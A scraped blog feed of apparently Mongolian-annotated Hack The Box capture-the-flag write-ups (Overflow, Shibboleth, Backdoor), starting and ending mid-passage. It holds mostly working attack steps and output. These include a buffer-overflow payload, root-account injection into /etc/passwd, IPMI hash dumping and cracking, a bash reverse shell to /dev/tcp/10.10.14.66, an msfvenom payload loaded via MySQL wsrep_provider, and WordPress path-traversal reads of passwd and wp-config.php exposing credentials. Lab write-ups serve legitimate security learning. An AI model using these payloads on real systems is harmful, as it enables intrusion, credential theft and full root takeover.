-0x80(%ebp),%eax 0x565558dd \u0026lt;+130\u0026gt;: push %eax 0x565558de \u0026lt;+131\u0026gt;: lea -0x233d(%ebx),%eax 0x565558e4 \u0026lt;+137\u0026gt;: push %eax 0x565558e5 \u0026lt;+138\u0026gt;: call 0x565556c0 \u0026lt;__isoc99_scanf@plt\u0026gt; 0x565558ea \u0026lt;+143\u0026gt;: add $0x10,%esp 0x565558ed \u0026lt;+146\u0026gt;: sub $0xc,%esp 0x565558f0 \u0026lt;+149\u0026gt;: lea -0x233a(%ebx),%eax 0x565558f6 \u0026lt;+155\u0026gt;: push %eax эхэлж байгаа 0x5655585b\npython -c “print(‘\\x41’ * 44 + ‘\\x5b\\x58\\x55\\x56’)” python -c \u0026#34;print(\u0026#39;\\x41\u0026#39; * 44 + \u0026#39;\\x5b\\x58\\x55\\x56\u0026#39;)\u0026#34; ## AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[XUV gdb\n(gdb) r The program being debugged has been started already. Start it from the beginning? (y or n) y Starting program: /home/va4mi/Documents/htb/machine/Overflow/www/file_encrypt This is the code 1804289383. Enter the Pin: -202976456 name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[XUV Thanks for checking. You can give your feedback for improvements at developer@overflow.htb Enter Input File: 8.7 Root user үүсгэх Machine:\ncp /etc/passwd /tmp/passwd tester@overflow:/opt/file_encrypt$ cd tester@overflow:~$ cp /etc/passwd /tmp/passwd tester@overflow:~$ cd /tmp/ tester@overflow:/tmp$ ls passwd systemd-private-1540515aec41459da3c1999dc74ef5f6-apache2.service-otzxtp systemd-private-1540515aec41459da3c1999dc74ef5f6-systemd-resolved.service-gHFf4R systemd-private-1540515aec41459da3c1999dc74ef5f6-systemd-timesyncd.service-agZrcR vmware-root_644-2730496954 tester@overflow:/tmp$ openssl passwd -1 -salt junkhead testing123 ## $1$junkhead$zXM9KUoB7KLu8Zm.JhCL31 ## echo \u0026#34;junkhead:$1$junkhead$zXM9KUoB7KLu8Zm.JhCL31:0:0:root:/root:/bin/bash\u0026#34; \u0026gt;\u0026gt; /tmp/passwd root2:r9PB6IP00tOFkjAH - нэмж оруулна\n... postfix:x:111:116::/var/spool/postfix:/usr/sbin/nologin mysql:x:112:118:MySQL Server,,,:/nonexistent:/bin/false developer:x:1001:1001::/home/developer:/bin/sh sshd:x:109:65534::/run/sshd:/usr/sbin/nologin root5:KWi2XW05LmkMg:0:0:root:/root:/bin/bash dambo::0:0:root:/root:/bin/bash encrypt -\u0026gt; passwd\n#!/usr/bin/python3 source = open(\u0026#39;/tmp/passwd\u0026#39;, \u0026#39;rb\u0026#39;).read() dest = open(\u0026#39;/tmp/passwd2\u0026#39;, \u0026#39;wb\u0026#39;) for i in source: dest.write(bytes([i ^ 0x9b])) -rw-rw-r-- 1 tester tester 148 Mar 21 15:45 encrypt.py -rw-r--r-- 1 tester tester 1.7K Mar 21 15:39 passwd python3 encrypt.py -rw-rw-r-- 1 tester tester 1.7K Mar 21 15:45 passwd2 tester@overflow:/opt/file_encrypt$ ./file_encrypt This is the code 1804289383. Enter the Pin: -202976456 name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[XUV Thanks for checking. You can give your feedback for improvements at developer@overflow.htb Enter Input File: /tmp/passwd2 Enter Encrypted File: /etc/passwd Segmentation fault (core dumped) tester@overflow:/opt/file_encrypt$ cat /ect/passwd #### postfix:x:111:116::/var/spool/postfix:/usr/sbin/nologin mysql:x:112:118:MySQL Server,,,:/nonexistent:/bin/false developer:x:1001:1001::/home/developer:/bin/sh sshd:x:109:65534::/run/sshd:/usr/sbin/nologin root5:KWi2XW05LmkMg:0:0:root:/root:/bin/bash dambo::0:0:root:/root:/bin/bash openssl passwd -1 testing $1$WoRrIRT4$aVl7dx43e4Grq0yh5J78c0 ### echo \u0026#34;batman:$1$WoRrIRT4$aVl7dx43e4Grq0yh5J78c0:0:0:root:/root:/bin/bash\u0026#34; \u0026gt;\u0026gt; /tmp/passwd openssl password generate хийх гэхээр орохгүй байна\u0026hellip;\nroot2:testing\necho root2:KWi2XW05LmkMg:0:0:root:/root:/bin/bash \u0026gt;\u0026gt; /tmp/passwd Root.txt\n49f84c69a7******* ","permalink":"https://cadil.github.io/posts/2024-03-07-htb-overflow-writeup/","summary":"1. IP Address # Machine Address 10.10.11.136 # Local Address 10.10.14.4 2. Nmap nmap -sV -sC -oA nmap/overflow 10.10.11.119 Out:\nStarting Nmap 7.91 ( https://nmap.org ) at 2022-02-27 01:01 EST Nmap scan report for 10.10.11.119 Host is up (0.24s latency). Not shown: 997 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 eb:7c:15:8f:f2:cc:d4:26:54:c1:e1:57:0d:d5:b6:7c (RSA) | 256 d9:5d:22:85:03:de:ad:a0:df:b0:c3:00:aa:87:e8:9c (ECDSA) |_ 256 fa:ec:32:f9:47:17:60:7e:e0:ba:b6:d1:77:fb:07:7b (ED25519) 25/tcp open smtp Postfix smtpd |_smtp-commands: overflow, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, 80/tcp open http Apache httpd 2.","title":"HTB - Overflow"},{"content":"1. IP Address # Machine IP 10.10.11.124 2. Nmap nmap -sV -sC -oA nmap/shibboleth 10.10.11.124 Starting Nmap 7.91 ( https://nmap.org ) at 2022-02-25 00:44 EST Nmap scan report for 10.10.11.124 Host is up (0.25s latency). Not shown: 999 closed ports PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.41 |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Did not follow redirect to http://shibboleth.htb/ Service Info: Host: shibboleth.htb Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 26.19 seconds shibboleth.htb -\u0026gt; /etc/hosts\nsudo nmap -sU -top-ports=20 shibboleth.htb Starting Nmap 7.91 ( https://nmap.org ) at 2022-02-25 00:47 EST Nmap scan report for shibboleth.htb (10.10.11.124) Host is up (0.24s latency). PORT STATE SERVICE 53/udp closed domain 67/udp closed dhcps 68/udp closed dhcpc 69/udp closed tftp 123/udp closed ntp 135/udp closed msrpc 137/udp closed netbios-ns 138/udp closed netbios-dgm 139/udp open|filtered netbios-ssn 161/udp open|filtered snmp 162/udp closed snmptrap 445/udp closed microsoft-ds 500/udp closed isakmp 514/udp closed syslog 520/udp closed route 631/udp closed ipp 1434/udp closed ms-sql-m 1900/udp closed upnp 4500/udp open|filtered nat-t-ike 49152/udp closed unknown Nmap done: 1 IP address (1 host up) scanned in 11.64 seconds 3. Gobuster gobuster dir -u http://shibboleth.htb -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://shibboleth.htb [+] Method: GET [+] Threads: 10 [+] Wordlist: /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.1.0 [+] Timeout: 10s =============================================================== 2022/02/25 00:50:21 Starting gobuster in directory enumeration mode =============================================================== /assets (Status: 301) [Size: 317] [--\u0026gt; http://shibboleth.htb/assets/] /forms (Status: 301) [Size: 316] [--\u0026gt; http://shibboleth.htb/forms/] Хэрэгтэй зүйл олдсонгүй.\n4. Snmpwalk snmpwalk -v2c -c public 10.10.11.124 . \u0026gt; common.txt Timeout: No Response from 10.10.11.124 no response\n5. Ffuf ffuf -u \u0026#34;http://shibboleth.htb/FUZZ\u0026#34; -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt -fc 403 v1.3.1 ________________________________________________ :: Method : GET :: URL : http://shibboleth.htb/FUZZ :: Wordlist : FUZZ: /opt/SecLists/Discovery/Web-Content/raft-small-words.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405 :: Filter : Response status: 403 ________________________________________________ assets [Status: 301, Size: 317, Words: 20, Lines: 10] forms [Status: 301, Size: 316, Words: 20, Lines: 10] . [Status: 200, Size: 59474, Words: 17014, Lines: 1324] [WARN] Caught keyboard interrupt (Ctrl-C) subdomain\nffuf -u \u0026#34;http://shibboleth.htb\u0026#34; -H \u0026#34;Host:FUZZ.shibboleth.htb\u0026#34; -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -mc 200 v1.3.1 ________________________________________________ :: Method : GET :: URL : http://shibboleth.htb :: Wordlist : FUZZ: /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt :: Header : Host: FUZZ.shibboleth.htb :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200 ________________________________________________ monitor [Status: 200, Size: 3686, Words: 192, Lines: 30] monitoring [Status: 200, Size: 3686, Words: 192, Lines: 30] zabbix [Status: 200, Size: 3686, Words: 192, Lines: 30] :: Progress: [4989/4989] :: Job [1/1] :: 169 req/sec :: Duration: [0:00:32] :: Errors: 0 :: Нэмэх: monitor.shibboleth.htb monitoring.shibboleth.htb zabbix.shibboleth.htb -\u0026gt; /etc/hosts\nnmap дахин уншуулах:\nsudo nmap -sS -A -sC -sV -Pn -sU --min-rate 5000 10.10.11.124 удаад байна\nsudo nmap -sU -sV -sC shibboleth.htb -T4 удаад байна\nsudo nmap -sU -sV -sC 10.10.11.124 --min-rate 7500 -F 6. User Datagram Protocol (UDP) User Datagram Protocol (UDP) is a communications protocol that is primarily used to establish low-latency and loss-tolerating connections between applications on the internet.\nNmap scan report for shibboleth.htb (10.10.11.124) Host is up (0.24s latency). Not shown: 93 open|filtered ports PORT STATE SERVICE VERSION 520/udp closed route 623/udp open asf-rmcp 999/udp closed applix 1433/udp closed ms-sql-s 1645/udp closed radius 31337/udp closed BackOrifice 49152/udp closed unknown 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port623-UDP:V=7.91%I=7%D=2/25%Time=62187E64%P=x86_64-pc-linux-gnu%r(ipm SF:i-rmcp,1E,\u0026#34;\\x06\\0\\xff\\x07\\0\\0\\0\\0\\0\\0\\0\\0\\0\\x10\\x81\\x1cc\\x20\\x008\\0\\x01 SF:\\x97\\x04\\x03\\0\\0\\0\\0\\t\u0026#34;); Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 603.57 seconds 623/udp open asf-rmcp\n7. Metasploit 623/udp open asf-rmcp\nsudo msfdb run use auxiliary/scanner/ipmi/ipmi_version ### show options Module options (auxiliary/scanner/ipmi/ipmi_version): Name Current Setting Required Description ---- --------------- -------- ----------- BATCHSIZE 256 yes The number of hosts to probe in each set RHOSTS yes The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-M etasploit RPORT 623 yes The target port (UDP) THREADS 10 yes The number of concurrent threads set RHOSTS 10.10.11.124 run [*] Sending IPMI requests to 10.10.11.124-\u0026gt;10.10.11.124 (1 hosts) [+] 10.10.11.124:623 - IPMI - IPMI-2.0 UserAuth(auth_msg, auth_user, non_null_user) PassAuth(password, md5, md2, null) Level(1.5, 2.0) [*] Scanned 1 of 1 hosts (100% complete) [*] Auxiliary module execution completed IPMI - IPMI-2.0 use auxiliary/scanner/ipmi/ipmi_dumphashes set RHOSTS 10.10.11.124 run [+] 10.10.11.124:623 - IPMI - Hash found: Administrator:62dd821c020200005e2e318787cfa1ad1422a79bec99e956a44d8b6fe005174bef1e83cc051b474da123456789abcdefa123456789abcdef140d41646d696e6973747261746f72:9c69d04f7d723e389b00bfd89e6ae99276fb99c6 [*] Scanned 1 of 1 hosts (100% complete) [*] Auxiliary module execution completed Administrator\nHashcat\nvi hash ## add # 62dd821c020200005e2e318787cfa1ad1422a79bec99e956a44d8b6fe005174bef1e83cc051b474da123456789abcdefa123456789abcdef140d41646d696e6973747261746f72:9c69d04f7d723e389b00bfd89e6ae99276fb99c6 hashcat -m 7300 hash /usr/share/wordlists/rockyou.txt 7300 | IMPI2 RAKP HMAC-SHA1 | Network Protocol\nDictionary cache built: * Filename..: /usr/share/wordlists/rockyou.txt * Passwords.: 14344392 * Bytes.....: 139921507 * Keyspace..: 14344385 * Runtime...: 4 secs 62dd821c020200005e2e318787cfa1ad1422a79bec99e956a44d8b6fe005174bef1e83cc051b474da123456789abcdefa123456789abcdef140d41646d696e6973747261746f72:9c69d04f7d723e389b00bfd89e6ae99276fb99c6:ilovepumkinpie1 Session..........: hashcat Status...........: Cracked Hash.Name........: IPMI2 RAKP HMAC-SHA1 Hash.Target......: 62dd821c020200005e2e318787cfa1ad1422a79bec99e956a44...fb99c6 Time.Started.....: Fri Feb 25 02:34:11 2022 (10 secs) Time.Estimated...: Fri Feb 25 02:34:21 2022 (0 secs) Guess.Base.......: File (/usr/share/wordlists/rockyou.txt) Guess.Queue......: 1/1 (100.00%) Speed.#1.........: 835.7 kH/s (0.99ms) @ Accel:1024 Loops:1 Thr:1 Vec:8 Recovered........: 1/1 (100.00%) Digests Progress.........: 7395328/14344385 (51.56%) Rejected.........: 0/7395328 (0.00%) Restore.Point....: 7394304/14344385 (51.55%) Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1 Candidates.#1....: ilovequay -\u0026gt; ilovepaul0 Started: Fri Feb 25 02:33:35 2022 Stopped: Fri Feb 25 02:34:22 2022 Administrator ilovepumkinpie1\n8. Exploitation nc -lvnp 9001 system.run[/bin/bash -c \u0026#34;/bin/bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.66/9001 0\u0026gt;\u0026amp;1\u0026#34;,nowait] 8.1 Shell balance python3 -c \u0026#39;import pty;pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; ctrl+z\nstty raw -echo f+g [enter enter] буцаад nc орлоо\nexport TERM=xterm 8.2 User.txt id\nuid=110(zabbix) gid=118(zabbix) groups=118(zabbix passwd\nroot:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin messagebus:x:103:106::/nonexistent:/usr/sbin/nologin syslog:x:104:110::/home/syslog:/usr/sbin/nologin _apt:x:105:65534::/nonexistent:/usr/sbin/nologin tss:x:106:112:TPM software stack,,,:/var/lib/tpm:/bin/false landscape:x:108:114::/var/lib/landscape:/usr/sbin/nologin pollinate:x:109:1::/var/cache/pollinate:/bin/false ipmi-svc:x:1000:1000:ipmi-svc,,,:/home/ipmi-svc:/bin/bash systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin zabbix:x:110:118::/var/lib/zabbix/:/usr/sbin/nologin Debian-snmp:x:111:119::/var/lib/snmp:/bin/false mysql:x:112:120:MySQL Server,,,:/nonexistent:/bin/false ipmi-svc\nsu - ipmi-svc ilovepumkinpie1 #id uid=1000(ipmi-svc) gid=1000(ipmi-svc) groups=1000(ipmi-svc) user.txt\n1bcfcca******* 9. Enumeration linpeas\ntmp$ chmod +x linpeas.sh ./linpeas.sh ╔══════════╣ Readable files belonging to root and readable by me but not world readable -rw-r----- 1 root ipmi-svc 22306 Oct 18 09:24 /etc/zabbix/zabbix_server.conf.dpkg-dist -rw-r----- 1 root ipmi-svc 21863 Apr 24 2021 /etc/zabbix/zabbix_server.conf ╔══════════╣ Analyzing Zabbix Files (limit 70) -rw-r----- 1 root ipmi-svc 21863 Apr 24 2021 /etc/zabbix/zabbix_server.conf LogFile=/var/log/zabbix/zabbix_server.log LogFileSize=0 PidFile=/run/zabbix/zabbix_server.pid SocketDir=/run/zabbix DBName=zabbix DBUser=zabbix DBPassword=bloooarskybluh mysql -D zabbix -u zabbix -p 9.1 CVE-2021-27928 Local VM\nmsfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.66 LPORT=9003 -f elf-so -o elf [-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload [-] No arch selected, selecting arch: x64 from the payload No encoder specified, outputting raw payload Payload size: 74 bytes Final size of elf-so file: 476 bytes Saved as: elf mv elf www python3 http.server # Machine VM curl 10.10.14.66:9003/elf -o elf # Local VM nc -lvnp 9003 mysql\nSET GLOBAL wsrep_provider=\u0026#34;/tmp/elf\u0026#34;; shell balance:\npython3 -c \u0026#39;import pty;pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; root.txt\n9a41bd********* ","permalink":"https://cadil.github.io/posts/2024-03-06-htb-shibboleth-writeup/","summary":"1. IP Address # Machine IP 10.10.11.124 2. Nmap nmap -sV -sC -oA nmap/shibboleth 10.10.11.124 Starting Nmap 7.91 ( https://nmap.org ) at 2022-02-25 00:44 EST Nmap scan report for 10.10.11.124 Host is up (0.25s latency). Not shown: 999 closed ports PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.41 |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Did not follow redirect to http://shibboleth.htb/ Service Info: Host: shibboleth.htb Service detection performed. Please report any incorrect results at https://nmap.","title":"HTB - Shibboleth"},{"content":"1. IP Address # Machine Address 10.10.11.125 2. Nmap nmap -p 1-2000 -sV -sC -oA nmap/backdoor_with_port 10.10.11.125 Starting Nmap 7.91 ( https://nmap.org ) at 2022-02-24 02:43 EST Nmap scan report for 10.10.11.125 Host is up (0.24s latency). Not shown: 1997 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 b4:de:43:38:46:57:db:4c:21:3b:69:f3:db:3c:62:88 (RSA) | 256 aa:c9:fc:21:0f:3e:f4:ec:6b:35:70:26:22:53:ef:66 (ECDSA) |_ 256 d2:8b:e4:ec:07:61:aa:ca:f8:ec:1c:f8:8c:c1:f6:e1 (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-generator: WordPress 5.8.1 |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Backdoor \u0026amp;#8211; Real-Life 1337/tcp open waste? Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 72.85 seconds 22,80,1337?\nnmap -vvv -p 1337 -A -v -sC -sV -oN intial.nmap 10.10.11.125 # Nmap 7.91 scan initiated Thu Feb 24 02:54:28 2022 as: nmap -vvv -p 1337 -A -v -sC -sV -oN intial.nmap 10.10.11.125 Nmap scan report for 10.10.11.125 Host is up, received syn-ack (0.24s latency). Scanned at 2022-02-24 02:54:29 EST for 23s PORT STATE SERVICE REASON VERSION 1337/tcp open waste? syn-ack Read data files from: /usr/bin/../share/nmap Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Thu Feb 24 02:54:52 2022 -- 1 IP address (1 host up) scanned in 23.49 seconds 3. Gobuster gobuster dir -u http://10.10.11.125 -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.11.125 [+] Method: GET [+] Threads: 10 [+] Wordlist: /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.1.0 [+] Timeout: 10s =============================================================== 2022/02/24 02:31:56 Starting gobuster in directory enumeration mode =============================================================== /wp-content (Status: 301) [Size: 317] [--\u0026gt; http://10.10.11.125/wp-content/] /wp-includes (Status: 301) [Size: 318] [--\u0026gt; http://10.10.11.125/wp-includes/] /wp-admin (Status: 301) [Size: 315] [--\u0026gt; http://10.10.11.125/wp-admin/] Progress: 25236 / 220561 (11.44%) ^C [!] Keyboard interrupt detected, terminating. =============================================================== 2022/02/24 02:42:04 Finished ============================================================== /wp-includes,/wp-content 4. Exploitation http://backdoor.htb/wp-content/plugins/ http://backdoor.htb/wp-content/plugins/ebook-download/\n=== Plugin Name === Contributors: zedna Donate link: https://www.paypal.com/cgi-bin/webscr?cmd=_donations\u0026amp;business=3ZVGZTC7ZPCH2\u0026amp;lc=CZ\u0026amp;item_name=Zedna%20Brickick%20Website\u0026amp;currency_code=USD\u0026amp;bn=PP%2dDonationsBF%3abtn_donateCC_LG%2egif%3aNonHosted Tags: ebook, file, download Requires at least: 3.0.4 Tested up to: 4.4 Stable tag: 1.1 License: GPLv2 or later License URI: http://www.gnu.org/licenses/gpl-2.0.htm Stable tag: 1.1\nCurl\ncurl http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/etc/passwd \u0026gt; passwd.txt passwd.txt:\n/etc/passwd/etc/passwd/etc/passwdroot:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin messagebus:x:103:106::/nonexistent:/usr/sbin/nologin syslog:x:104:110::/home/syslog:/usr/sbin/nologin _apt:x:105:65534::/nonexistent:/usr/sbin/nologin tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin pollinate:x:110:1::/var/cache/pollinate:/bin/false usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin sshd:x:112:65534::/run/sshd:/usr/sbin/nologin systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin user:x:1000:1000:user:/home/user:/bin/bash lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false mysql:x:113:118:MySQL Server,,,:/nonexistent:/bin/false \u0026lt;script\u0026gt;window.close()\u0026lt;/script\u0026gt; curl\ncurl http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../wp-config.php \u0026gt; wp-config.php wp-config.php:\n../../../wp-config.php../../../wp-config.php../../../wp-config.php\u0026lt;?php /** * The base configuration for WordPress * * The wp-config.php creation script uses this file during the installation. * You don\u0026#39;t have to use the web site, you can copy this file to \u0026#34;wp-config.php\u0026#34; * and fill in the values. * * This file contains the following configurations: * * * MySQL settings * * Secret keys * * Database table prefix * * ABSPATH * * @link https://wordpress.org/support/article/editing-wp-config-php/ * * @package WordPress */ // ** MySQL settings - You can get this info from your web host ** // /** The name of the database for WordPress */ define( \u0026#39;DB_NAME\u0026#39;, \u0026#39;wordpress\u0026#39; ); /** MySQL database username */ define( \u0026#39;DB_USER\u0026#39;, \u0026#39;wordpressuser\u0026#39; ); /** MySQL database password */ define( \u0026#39;DB_PASSWORD\u0026#39;, \u0026#39;MQYBJSaD#DxG6qbm\u0026#39; ); /** MySQL hostname */ define( \u0026#39;DB_HOST\u0026#39;, \u0026#39;localhost\u0026#39; ); /** Database charset to use in creating database tables. */ define( \u0026#39;DB_CHARSET\u0026#39;, \u0026#39;utf8\u0026#39; ); /** The database collate type. Don\u0026#39;t change this if in doubt. */ define( \u0026#39;DB_COLLATE\u0026#39;, \u0026#39;\u0026#39; ); /**#@+ * Authentication unique keys and salts. * * Change these to different unique phrases! You can generate these using * the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}. * * You can change these at any point in time to invalidate all existing cookies. * This will force all users to have to log in again. * * @since 2.6.0 */ /* That\u0026#39;s all, stop editing! Happy blogging. */ /** Absolute path to the WordPress directory. */ if ( !defined(\u0026#39;ABSPATH\u0026#39;) ) define(\u0026#39;ABSPATH\u0026#39;, dirname(__FILE__) . \u0026#39;/\u0026#39;); /* THIS IS CUSTOM CODE CREATED AT ZEROFRACTAL TO MAKE SITE ACCESS DYNAMIC */ $currenthost = \u0026#34;http://\u0026#34;.$_SERVER[\u0026#39;HTTP_HOST\u0026#39;]; $currentpath = preg_replace(\u0026#39;@/+$@\u0026#39;,\u0026#39;\u0026#39;,dirname($_SERVER[\u0026#39;SCRIPT_NAME\u0026#39;])); $currentpath = preg_replace(\u0026#39;/\\/wp.+/\u0026#39;,\u0026#39;\u0026#39;,$currentpath); define(\u0026#39;WP_HOME\u0026#39;,$currenthost.$currentpath); define(\u0026#39;WP_SITEURL\u0026#39;,$currenthost.$currentpath); define(\u0026#39;WP_CONTENT_URL\u0026#39;, $currenthost.$currentpath.\u0026#39;/wp-content\u0026#39;); define(\u0026#39;WP_PLUGIN_URL\u0026#39;, $currenthost.$currentpath.\u0026#39;/wp-content/plugins\u0026#39;); define(\u0026#39;DOMAIN_CURRENT_SITE\u0026#39;, $currenthost.$currentpath ); @define(\u0026#39;ADMIN_COOKIE_PATH\u0026#39;, \u0026#39;./\u0026#39;); define( \u0026#39;AUTH_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;SECURE_AUTH_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;LOGGED_IN_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;NONCE_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;AUTH_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;SECURE_AUTH_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;LOGGED_IN_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;NONCE_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); /**#@-*/ /** * WordPress database table prefix. * * You can have multiple installations in one database if you give each * a unique prefix. Only numbers, letters, and underscores please! */ $table_prefix = \u0026#39;wp_\u0026#39;; /** * For developers: WordPress debugging mode. * * Change this to true to enable the display of notices during development. * It is strongly recommended that plugin and theme developers use WP_DEBUG * in their development environments. * * For information on other constants that can be used for debugging, * visit the documentation. * * @link https://wordpress.org/support/article/debugging-in-wordpress/ */ define( \u0026#39;WP_DEBUG\u0026#39;, false ); /* Add any custom values between this line and the \u0026#34;stop editing\u0026#34; line. */ /* That\u0026#39;s all, stop editing! Happy publishing. */ /** Absolute path to the WordPress directory. */ if ( ! defined( \u0026#39;ABSPATH\u0026#39; ) ) { define( \u0026#39;ABSPATH\u0026#39;, __DIR__ . \u0026#39;/\u0026#39; ); } /** Sets up WordPress vars and included files. */ require_once ABSPATH . \u0026#39;wp-settings.php\u0026#39;; \u0026lt;script\u0026gt;window.close()\u0026lt;/script\u0026gt; wfuzz:\nwfuzz -u http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/proc/FUZZ/cmdline -z range,1-1000 --hw 1 ===================================================================== ID Response Lines Word Chars Payload ===================================================================== 000000840: 200 0 L 12 W 183 Ch \u0026#34;840\u0026#34; 000000842: 200 0 L 11 W 181 Ch \u0026#34;842\u0026#34; 000000836: 200 0 L 3 W 128 Ch \u0026#34;836\u0026#34; 000000852: 200 0 L 8 W 138 Ch \u0026#34;852\u0026#34; Total time: 0 Processed Requests: 1000 Filtered Requests: 996 Requests/sec.: 0 curl 840\ncurl 